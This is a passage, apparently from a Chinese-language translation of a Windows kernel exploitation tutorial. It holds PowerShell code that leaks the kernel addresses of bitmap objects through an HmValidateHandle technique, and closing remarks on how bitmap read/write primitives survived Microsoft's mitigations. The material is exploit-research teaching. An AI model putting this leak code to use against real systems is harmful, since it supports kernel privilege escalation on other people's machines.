                Destroy-WindowObject -Handle $TestWindowHandle
                [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
                $BitmapHandle = [HmValidateHandleBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) # +4 kb size
                break
            }
        }
        Destroy-WindowObject -Handle $TestWindowHandle
    }
     
    $BitMapObject = @()
    $HashTable = @{
        BitmapHandle = $BitmapHandle
        BitmapKernelObj = $($KernelArray[$i])
        BitmappvScan0 = $KernelArray[$i] + 0x50
    }
    $Object = New-Object PSObject -Property $HashTable
    $BitMapObject += $Object
    $BitMapObject
}
```

快速运行一下。

![](/images/exploit/fuzzySecurity/20180316_11.jpg)

SURFOBJ结构体是如此的明显，我们甚至无需给出任何符号就可以说明这一次的泄露是成功的。

![](/images/exploit/fuzzySecurity/20180316_12.jpg)

## 后序

非常漂亮！我们挚爱的Bitmap溯源在两轮微软的缓解措施下顽强的活了下来。Bitmap提供了一个真实有效（且方便）的读写本源，它在相当宽泛的内核利用原理中都可以被用到。不可避免的，微软会继续下绊子，让我们的策略失效，但是谁又能保证在第三轮实锤面前我们不能再次绕过呢？